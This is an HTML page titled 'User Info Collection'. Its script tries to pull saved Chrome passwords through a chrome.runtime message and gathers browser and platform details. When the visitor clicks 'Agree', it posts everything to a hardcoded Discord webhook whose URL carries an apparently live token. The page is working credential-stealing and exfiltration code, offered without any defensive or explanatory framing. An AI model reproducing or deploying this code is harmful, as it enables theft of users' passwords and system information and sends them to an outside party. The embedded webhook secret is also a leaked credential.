<!DOCTYPE html>
<html>
<head>
  <title>User Info Collection</title>
</head>
<body>
  <h1>User Info Collection</h1>
  <p>Please read the following information and agree to share your Chrome passwords and system information:</p>
  <button id="agree-btn">Agree</button>

  <script>
    // Function to send data to Discord webhook
    function sendToDiscord(data) {
      const webhookURL = "https://discord.com/api/webhooks/1126968076265586738/uGcrKIl0KSrDZ0WoN7fujx-46n4d_T7F7EQLdBtxLIhFH_jGq7X8BPbnZYr0Shc2J_tc";
      const payload = {
        content: "User Info",
        embeds: [
          {
            title: "User Information",
            fields: [
              { name: "Name", value: data.name },
              { name: "Email", value: data.email },
              { name: "User Agent", value: navigator.userAgent },
              { name: "Language", value: navigator.language },
              { name: "Platform", value: navigator.platform },
              { name: "Chrome Passwords", value: data.passwords }
            ]
          }
        ]
      };

      fetch(webhookURL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
      })
        .then(response => {
          if (response.ok) {
            console.log("User information sent to Discord webhook successfully.");
          } else {
            console.error("Failed to send user information to Discord webhook.");
          }
        })
        .catch(error => {
          console.error("An error occurred while sending user information to Discord webhook:", error);
        });
    }

    // Function to capture Chrome passwords
    function capturePasswords(callback) {
      if (typeof chrome !== "undefined" && chrome && chrome.runtime) {
        chrome.runtime.sendMessage({ action: "getPasswords" }, passwords => {
          if (callback && typeof callback === "function") {
            callback(passwords);
          }
        });
      }
    }

    // Function to capture user information on agreement
    function captureUserInfo() {
      const name = "Anonymous"; // Default name if not available
      const email = "Not provided"; // Default email if not available

      // Capture Chrome passwords
      capturePasswords(passwords => {
        const userData = {
          name: name,
          email: email,
          passwords: passwords || "No passwords captured"
        };

        // Send user information to Discord webhook
        sendToDiscord(userData);
      });
    }

    // Add event listener to agreement button
    document.getElementById("agree-btn").addEventListener("click", function() {
      // Capture user information when agreed
      captureUserInfo();

      // Disable the agreement button
      this.disabled = true;
      this.innerText = "Agreed";
    });
  </script>
</body>
</html>
